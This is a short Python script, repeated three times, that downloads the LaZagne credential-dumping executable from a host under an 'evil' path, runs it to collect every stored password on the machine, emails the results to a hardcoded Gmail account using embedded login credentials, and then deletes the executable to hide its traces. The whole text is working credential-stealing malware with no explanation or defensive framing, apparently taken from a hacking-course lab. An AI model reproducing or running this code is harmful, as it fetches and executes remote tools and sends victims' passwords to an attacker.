#!/usr/bin/env python
import requests, os, tempfile
import subprocess, smtplib, re


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as outfile:
        outfile.write(get_response.content)


tempdir = tempfile.gettempdir()
os.chdir(tempdir)
download("http://10.0.2.7/evil/lazagne.exe")
result = (subprocess.check_output("lazagne.exe all", shell=True))
send_email("cur53onu@gmail.com", "Iamcur53@u", result)
os.remove("lazagne.exe")

# !/usr/bin/env python
import requests, os, tempfile
import subprocess, smtplib, re


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as outfile:
        outfile.write(get_response.content)


tempdir = tempfile.gettempdir()
os.chdir(tempdir)
download("http://10.0.2.7/evil/lazagne.exe")
result = (subprocess.check_output("lazagne.exe all", shell=True))
send_email("cur53onu@gmail.com", "Iamcur53@u", result)
os.remove("lazagne.exe")

# !/usr/bin/env python
import requests, os, tempfile
import subprocess, smtplib, re


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as outfile:
        outfile.write(get_response.content)


tempdir = tempfile.gettempdir()
os.chdir(tempdir)
download("http://10.0.2.7/evil/lazagne.exe")
result = (subprocess.check_output("lazagne.exe all", shell=True))
send_email("cur53onu@gmail.com", "Iamcur53@u", result)
os.remove("lazagne.exe")


